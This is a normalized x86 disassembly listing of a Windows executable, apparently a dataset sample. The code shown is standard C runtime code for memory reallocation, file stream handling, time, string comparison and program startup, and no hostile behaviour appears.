jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push 0x200
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_40b50f
add esp 0x24
test eax eax
je r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_4056f3
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_4055dd
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0xffffffe0
pop ebp
retn
sub_40571f
push 0x10
push r--data
call sub_4099f4
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_404e6b
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
push ebx
call sub_404d8e
pop ecx
jmp r-xdata
call sub_409a39
retn
cmp esi 0xffffffe0
jbe r-xdata
xor edi edi
mov [ ebp - 0x1c ] edi
cmp esi 0xffffffe0
ja r-xdata
xor eax eax
test esi esi
jne r-xdata
push esi
call sub_409dcf
pop ecx
call sub_407f64
push 0x4
call sub_408efb
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_408f2e
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_405863
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
mov edi [ ebp - 0x1c ]
test esi esi
jne r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
push ebx
push eax
call sub_40942c
add esp 0xc
test eax eax
je r-xdata
test edi edi
jne r-xdata
push esi
call sub_409dcf
pop ecx
test eax eax
je r-xdata
cmp [ rw-data ] edi
je r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
jmp r-xdata
inc esi
cmp esi edi
jne r-xdata
push esi
call sub_40970d
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
mov [ ebp - 0x1c ] ebx
jmp r-xdata
call sub_407f64
call sub_407f64
jmp r-xdata
test edi edi
jne r-xdata
push esi
call sub_409dcf
pop ecx
test eax eax
jne r-xdata
test edi edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push edi
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
xor esi esi
inc esi
mov [ ebp + 0xc ] esi
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_407f22
pop ecx
mov [ esi ] eax
jmp r-xdata
call sub_407f64
cmp [ ebp - 0x20 ] edi
je r-xdata
call sub_407f64
cmp [ ebp - 0x20 ] edi
jne r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
push eax
push ebx
push [ ebp - 0x1c ]
call sub_40b660
push ebx
call sub_408f2e
mov [ ebp - 0x20 ] eax
push ebx
push eax
call sub_408f5e
add esp 0x18
mov eax esi
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_407f22
mov [ esi ] eax
pop ecx
mov [ eax ] 0xc
jmp r-xdata
mov [ eax ] 0xc
push eax
push ebx
push [ ebp - 0x1c ]
call sub_40b660
push ebx
push [ ebp - 0x20 ]
call sub_408f5e
add esp 0x14
mov eax esi
sub_40593a
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
or ebx 0xffffffff
cmp esi edi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_407f64
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_407efc
add esp 0x14
or eax ebx
jmp r-xdata
mov [ esi + 0xc ] edi
mov eax ebx
push esi
call sub_4065cc
push esi
mov ebx eax
call sub_40bb2e
push esi
call sub_40b01d
push eax
call sub_40ba61
add esp 0x10
test eax eax
jge r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0x1c ]
cmp eax edi
je r-xdata
or ebx 0xffffffff
jmp r-xdata
push eax
call sub_404d8e
pop ecx
mov [ esi + 0x1c ] edi
sub_4059b1
push 0xc
push r--data
call sub_4099f4
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
xor edi edi
cmp esi edi
setne al
cmp eax edi
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_407f64
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_407efc
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
call sub_40a1ff
pop ecx
mov [ ebp - 0x4 ] edi
push esi
call sub_40593a
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_405a25
jmp r-xdata
mov [ esi + 0xc ] edi
call sub_409a39
retn
mov eax [ ebp - 0x1c ]
sub_405a2d
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp edi ebx
jne r-xdata
push edi
call sub_40b01d
cmp [ edi + 0x4 ] ebx
pop ecx
mov [ ebp - 0x4 ] eax
jge r-xdata
call sub_407f64
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_407efc
add esp 0x14
push 0x1
push ebx
push eax
call sub_40be28
add esp 0xc
cmp eax ebx
mov [ ebp - 0x8 ] eax
jl r-xdata
mov [ edi + 0x4 ] ebx
pop edi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov edx [ edi + 0xc ]
test edx 0x108
jne r-xdata
mov eax [ edi ]
mov ecx [ edi + 0x8 ]
push esi
mov esi eax
sub esi ecx
mov [ ebp - 0xc ] esi
test dl 0x3
je r-xdata
sub eax [ edi + 0x4 ]
jmp r-xdata
test dl dl
js r-xdata
mov edx [ ebp - 0x4 ]
mov esi [ ebp - 0x4 ]
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
test [ edx + esi + 0x4 ] 0x80
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
call sub_407f64
mov [ eax ] 0x16
jmp r-xdata
mov edx ecx
cmp edx eax
jae r-xdata
test [ edi + 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi eax
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
add eax ecx
mov edx [ edi + 0x4 ]
cmp edx ebx
jne r-xdata
pop esi
inc edx
cmp edx esi
jb r-xdata
inc [ ebp - 0xc ]
xor ebx ebx
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x4 ]
sub eax ecx
add eax edx
sar ebx 0x5
and esi 0x1f
lea ebx [ ebx * 4 + rw-data ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x80
je r-xdata
mov [ ebp - 0xc ] ebx
jmp r-xdata
cmp [ edx ] 0xa
jne r-xdata
mov eax [ ebp + 0x8 ]
sub [ ebp - 0x8 ] eax
push 0x2
push 0x0
push [ ebp - 0x4 ]
call sub_40be28
add esp 0xc
cmp eax [ ebp - 0x8 ]
jne r-xdata
push 0x0
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call sub_40be28
add esp 0xc
test eax eax
jge r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ecx eax
jmp r-xdata
mov eax 0x200
cmp [ ebp + 0x8 ] eax
ja r-xdata
cmp eax ecx
jb r-xdata
mov eax [ edi + 0x18 ]
mov ecx [ edi + 0xc ]
test cl 0x8
je r-xdata
cmp [ eax ] 0xa
jne r-xdata
test [ edi + 0xc ] 0x2000
jmp r-xdata
inc [ ebp + 0x8 ]
test ecx 0x400
je r-xdata
inc eax
inc [ ebp + 0x8 ]
je r-xdata
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x4
sub_405bca
push 0xc
push r--data
call sub_4099f4
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
push [ ebp + 0x8 ]
call sub_40a1ff
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x8 ]
call sub_405a2d
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_405c2e
mov eax [ ebp - 0x1c ]
call sub_407f64
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_407efc
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_409a39
retn
sub_405c38
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
jne r-xdata
and eax 0xffffffef
cmp [ ebp + 0x10 ] 0x1
mov [ esi + 0xc ] eax
jne r-xdata
call sub_407f64
mov [ eax ] 0x16
or eax 0xffffffff
jmp r-xdata
push esi
call sub_4065cc
mov eax [ esi + 0xc ]
pop ecx
test al al
jns r-xdata
push esi
call sub_405a2d
add [ ebp + 0xc ] eax
and [ ebp + 0x10 ] 0x0
pop ecx
pop esi
pop ebp
retn
test al 0x1
je r-xdata
and eax 0xfffffffc
mov [ esi + 0xc ] eax
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_40b01d
pop ecx
push eax
call sub_40be28
xor ecx ecx
add esp 0xc
cmp eax 0xffffffff
setne cl
dec ecx
mov eax ecx
test al 0x8
je r-xdata
test eax 0x400
jne r-xdata
mov [ esi + 0x18 ] 0x200
sub_405cc2
push 0xc
push r--data
call sub_4099f4
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
mov edi [ ebp + 0x10 ]
cmp edi esi
je r-xdata
call sub_407f64
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_407efc
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x8 ]
call sub_40a1ff
pop ecx
mov [ ebp - 0x4 ] esi
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_405c38
add esp 0xc
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_405d3d
mov eax [ ebp - 0x1c ]
cmp edi 0x1
je r-xdata
call sub_409a39
retn
cmp edi 0x2
jne r-xdata
sub_405d47
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
push 0x0
add eax 0x2ac18000
push 0x989680
adc ecx 0xfe624e21
push ecx
push eax
call sub_40bf10
cmp edx 0x7
jl r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
jg r-xdata
leave
retn
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
or eax 0xffffffff
mov edx eax
cmp eax 0x93406fff
jbe r-xdata
sub_405d98
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push esi
push edi
cmp [ ebp + 0x10 ] ebx
je r-xdata
xor eax eax
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_404a6a
cmp [ ebp + 0x8 ] ebx
jne r-xdata
mov edi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_407f64
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_407efc
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov esi 0x7fffffff
cmp [ ebp + 0x10 ] esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_407f64
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_407efc
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_407cb0
inc [ ebp + 0x8 ]
mov esi eax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_407cb0
add esp 0x10
inc edi
dec [ ebp + 0x10 ]
je r-xdata
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_40bf80
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub esi eax
mov eax esi
jmp r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi eax
je r-xdata
sub_405e8a
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_405d98
add esp 0x10
cmp [ ebp + 0x8 ] esi
jne r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
call sub_407f64
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_407efc
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
ja r-xdata
pop esi
pop ebp
retn
pop esi
pop ebp
jmp sub_40bf80
sub_405ee8
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0xc ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_407f64
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_407efc
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
push [ ebp + 0x14 ]
mov [ ebp - 0x18 ] eax
push [ ebp + 0x10 ]
mov [ ebp - 0x20 ] eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x1c ] 0x7fffffff
mov [ ebp - 0x14 ] 0x42
call sub_4081b7
add esp 0x10
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
pop ebx
leave
retn
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_407fad
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax esi
pop esi
sub_405f80
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push edi
push esi
call sub_40bff0
xor edi edi
pop ecx
cmp esi edi
jne r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
call sub_407f64
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_407efc
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov ecx 0x7fffffff
mov [ ebp - 0x14 ] 0x49
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] ecx
cmp eax ecx
ja r-xdata
pop edi
leave
retn
push [ ebp + 0x14 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ ebp + 0x8 ]
add esp 0x10
mov [ ebp - 0x1c ] eax
sub_405fed
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp + 0x10 ]
push eax
push 0x0
push [ ebp + 0xc ]
push sub_40c145
call sub_405f80
add esp 0x10
pop esi
pop ebp
retn
sub_406038
push 0x58
push r--data
call sub_4099f4
xor esi esi
mov [ ebp - 0x4 ] esi
lea eax [ ebp - 0x68 ]
push eax
call [ GetStartupInfoA@IAT ]
push 0xfffffffe
pop edi
mov [ ebp - 0x4 ] edi
mov eax 0x5a4d
cmp [ __dos_header ] ax
jne r-xdata
mov [ ebp - 0x1c ] esi
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
call sub_407b23
test eax eax
jne r-xdata
push 0x1c
call sub_40600f
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
call sub_40d77c
mov [ ebp - 0x4 ] ebx
call sub_40bb5f
test eax eax
jge r-xdata
push 0x10
call sub_40600f
cmp [ eax + r--data ] 0xe
jbe r-xdata
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_40d645
mov [ rw-data ] eax
call sub_40d58a
test eax eax
jge r-xdata
push 0x1b
call sub_4062c4
pop ecx
xor ecx ecx
cmp [ eax + __coff_header ] esi
setne cl
mov [ ebp - 0x1c ] ecx
jmp r-xdata
call sub_40d312
test eax eax
jge r-xdata
push 0x8
call sub_4062c4
pop ecx
xor ebx ebx
inc ebx
push ebx
call sub_408d4f
pop ecx
test eax eax
jne r-xdata
push ebx
call sub_406383
pop ecx
cmp eax esi
je r-xdata
push 0x9
call sub_4062c4
pop ecx
call sub_40d2b3
test [ ebp - 0x3c ] bl
je r-xdata
push eax
call sub_4062c4
pop ecx
push 0xa
pop ecx
movzx ecx [ ebp - 0x38 ]
jmp r-xdata
call sub_406560
mov [ ebp - 0x4 ] edi
jmp r-xdata
push eax
call sub_406534
push ecx
push eax
push esi
push __dos_header
call sub_402c86
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov eax [ ebp - 0x20 ]
jmp r-xdata
call sub_409a39
retn
sub_406177
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_40656f
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
jmp r-xdata
push eax
call sub_40654a
call sub_409a39
retn
sub_4061cf
push 0xc
push r--data
call sub_4099f4
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
call sub_40a128
push 0x20
pop ebx
add eax ebx
push eax
push 0x1
call sub_40a240
pop ecx
pop ecx
mov [ ebp - 0x4 ] esi
call sub_40a128
add eax ebx
push eax
call sub_40d964
pop ecx
mov edi eax
lea eax [ ebp + 0xc ]
push eax
push esi
push [ ebp + 0x8 ]
call sub_40a128
add eax ebx
push eax
call sub_4081b7
mov [ ebp - 0x1c ] eax
call sub_40a128
add eax ebx
push eax
push edi
call sub_40da00
add esp 0x18
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40626b
mov eax [ ebp - 0x1c ]
call sub_407f64
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_407efc
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_409a39
retn
sub_406294
mov edi edi
push ebp
mov ebp esp
push edi
mov edi 0x3e8
pop edi
pop ebp
retn
test eax eax
je r-xdata
push edi
call [ Sleep@IAT ]
push [ ebp + 0x8 ]
call [ GetModuleHandleW@IAT ]
add edi 0x3e8
cmp edi 0xea60
ja r-xdata
sub_4062c4
mov edi edi
push ebp
mov ebp esp
call sub_409d87
push [ ebp + 0x8 ]
call sub_409bdc
push [ rw-data ]
call sub_40778e
push 0xff
call eax
add esp 0xc
pop ebp
retn
sub_4062ed
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_406342
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebp
retn
add esi 0x4
call eax
sub_40635f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_406383
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_40db72
push r--data
push r--data
call sub_40635f
pop ecx
pop ecx
test eax eax
jne r-xdata
push rw-data
call sub_40dc30
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push sub_40d7a2
call sub_40db5b
mov eax r--data
mov [ esp ] r--data
call sub_406342
cmp [ rw-data ] 0x0
pop ecx
je r-xdata
push [ ebp + 0x8 ]
call [ rw-data ]
pop ecx
xor eax eax
push rw-data
call sub_40dc30
pop ecx
test eax eax
je r-xdata
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_406408
push 0x18
push r--data
call sub_4099f4
push 0x8
call sub_408efb
pop ecx
and [ ebp - 0x4 ] 0x0
xor ebx ebx
inc ebx
cmp [ rw-data ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40651f
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_409a39
retn
mov [ rw-data ] ebx
push 0x8
call sub_408e21
pop ecx
push [ ebp + 0x8 ]
call sub_406318
push r--data
mov eax r--data
call sub_406342
pop ecx
push [ rw-data ]
call sub_40778e
pop ecx
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
je r-xdata
push r--data
mov eax r--data
call sub_406342
pop ecx
push [ rw-data ]
call sub_40778e
pop ecx
mov esi eax
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] esi
call sub_407785
cmp [ esi ] eax
je r-xdata
sub esi 0x4
mov [ ebp - 0x24 ] esi
cmp esi edi
jb r-xdata
cmp esi edi
jb r-xdata
push [ esi ]
call sub_40778e
mov edi eax
call sub_407785
mov [ esi ] eax
call edi
push [ rw-data ]
call sub_40778e
mov edi eax
push [ rw-data ]
call sub_40778e
add esp 0xc
cmp [ ebp - 0x1c ] edi
jne r-xdata
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x20 ] eax
mov esi eax
mov [ ebp - 0x24 ] esi
cmp [ ebp - 0x20 ] eax
je r-xdata
mov edi [ ebp - 0x28 ]
jmp r-xdata
sub_40657e
mov edi edi
push esi
call sub_407785
mov esi eax
push esi
call sub_409dc0
push esi
call sub_40df67
push esi
call sub_407dc5
push esi
call sub_40df58
push esi
call sub_40df49
push esi
call sub_40dd37
push esi
call sub_40d152
push esi
call sub_40dd26
push sub_40654a
call sub_407713
add esp 0x24
mov [ rw-data ] eax
pop esi
retn
sub_4065cc
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_40b01d
pop ecx
push eax
call sub_40e709
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_406634
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_4065cc
pop ecx
test eax eax
je r-xdata
push esi
call sub_40667c
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_40b01d
push eax
call sub_40e7e5
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_40667c
push 0x14
push r--data
call sub_4099f4
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_408efb
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40674d
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_409a39
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_40a240
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_40671e
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_406634
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_406634
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_40675f
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x18 ]
call sub_404a6a
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_405e8a
add esp 0xc
cmp [ ebp - 0xc ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_407f64
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_407efc
add esp 0x14
cmp [ ebp - 0xc ] bl
je r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
push esi
call sub_407f64
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_407efc
add esp 0x14
cmp [ ebp - 0xc ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
movzx edx [ ebp - 0x8 ]
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
movzx ecx dx
movzx cx [ ecx + 0x11d ]
movzx ecx cx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov dl [ edx ]
cmp dl bl
jne r-xdata
movzx ecx [ edi ]
test [ ecx + eax + 0x1d ] 0x4
mov [ ebp - 0x8 ] ebx
jne r-xdata
pop edi
movzx edx [ ebp - 0x4 ]
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov [ ebp - 0x8 ] ecx
shl ecx 0x8
movzx dx dl
or cx dx
inc [ ebp + 0x8 ]
movzx ecx cx
mov si cx
mov [ ebp - 0x8 ] ecx
cmp si [ eax + 0x10 ]
jb r-xdata
mov [ ebp - 0x8 ] ebx
jmp r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
movzx ecx cx
mov si bx
jmp r-xdata
movzx ecx dx
movzx cx [ ecx + 0x11d ]
movzx ecx cx
jmp r-xdata
mov dl [ edi ]
dec [ ebp + 0x10 ]
cmp dl bl
je r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
cmp si [ eax + 0x16 ]
jb r-xdata
cmp si [ eax + 0x12 ]
ja r-xdata
mov si [ ebp - 0x8 ]
xor eax eax
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
mov [ ebp - 0x4 ] ecx
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0xc ] bl
je r-xdata
cmp si bx
je r-xdata
shl ecx 0x8
movzx dx dl
or cx dx
movzx ecx cx
inc edi
mov [ ebp - 0x4 ] ecx
cmp cx [ eax + 0x10 ]
jb r-xdata
mov cx [ ebp - 0x4 ]
